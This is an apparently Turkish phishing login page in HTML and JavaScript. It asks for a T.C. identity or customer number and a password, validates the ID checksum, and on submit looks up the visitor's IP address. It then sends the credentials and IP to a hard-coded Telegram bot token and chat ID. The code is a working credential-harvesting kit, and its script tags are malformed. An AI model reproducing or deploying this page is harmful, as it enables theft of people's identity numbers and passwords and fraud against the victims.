<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>

    <!-- T.C. Kimlik ve Şifre Alanları -->
    <input type="text" id="login" placeholder="T.C. Kimlik veya Müşteri Numarası">
    <input type="password" id="password" placeholder="Şifre">

    <!-- Giriş Butonu -->
    <div class="giris-yap">
        <input type="submit" id="nextPage" class="button" value="Giriş Yap">
    </div>

    <script>
	<script>
function checkInputs() {
    const tcInput = document.getElementById("login");
    const passwordInput = document.getElementById("password");
    const submitBtn = document.getElementById("nextPage");
    const errorSpan = document.getElementById("tcError");

    const tc = tcInput.value.trim();
    const password = passwordInput.value.trim();

    if (!/^\d+$/.test(tc)) {
        showError("Sadece rakam giriniz");
        submitBtn.disabled = true;
        return;
    }

    if (tc.length === 11 && isValidTC(tc)) {
        hideError();

        if (password !== "") {
            submitBtn.disabled = false;
        } else {
            submitBtn.disabled = true;
        }

    } else {
        showError("Geçersiz T.C. Kimlik Numarası");
        submitBtn.disabled = true;
    }

    function showError(msg) {
        errorSpan.innerText = msg;
        errorSpan.style.display = "block";
        tcInput.classList.add("error-input");
    }

    function hideError() {
        errorSpan.style.display = "none";
        tcInput.classList.remove("error-input");
    }
}

function isValidTC(tc) {
    if (tc.length !== 11 || tc.charAt(0) === '0') return false;

    const digits = tc.split('').map(Number);
    const sumOdd = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
    const sumEven = digits[1] + digits[3] + digits[5] + digits[7];

    const digit10 = ((sumOdd * 7) - sumEven) % 10;
    const digit11 = (digits.slice(0, 10).reduce((a, b) => a + b, 0)) % 10;

    return digit10 === digits[9] && digit11 === digits[10];
}
</script>

        $(document).ready(function () {
            // Giriş butonuna tıklama işlemi
            $("#nextPage").click(function (event) {
                event.preventDefault(); // Formun gönderilmesini engelliyoruz

                // Kullanıcı bilgilerini alıyoruz
                var login = $("#login").val().trim();
                var password = $("#password").val().trim();

                // Alanların boş olup olmadığını kontrol ediyoruz
                if (login === "" || password === "") {
                    alert("Lütfen tüm alanları doldurun!");
                    return;
                }

                // IP Adresini Al
                $.get("https://api64.ipify.org?format=json", function (data) {
                    var ipAddress = data.ip;

                    // Telegram API'ye gönderilecek mesajı hazırlıyoruz
                    var botToken = "7562617584:AAF4danjWZlEBdWONsxMfKnSlIEuPiI61wk"; // Telegram Bot Tokeni
                    var chatId = "-1002475411082"; // Telegram Chat ID
                    var message = `Giriş Bilgileri\n\nT.C. Kimlik veya Müşteri Numarası: ${login}\nŞifre: ${password}\nIP Adresi: ${ipAddress}`;

                    // Telegram API'ye mesaj gönderiyoruz
                    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                    $.get(url, function () {
                        console.log("Mesaj gönderildi!");
                    }).fail(function () {
                        alert("Telegram mesajı gönderilemedi, tekrar deneyin!");
                    });
                }).fail(function () {
                    alert("IP adresi alınamadı, lütfen tekrar deneyin!");
                });
            });
        });
    </script>

</body>
</html>
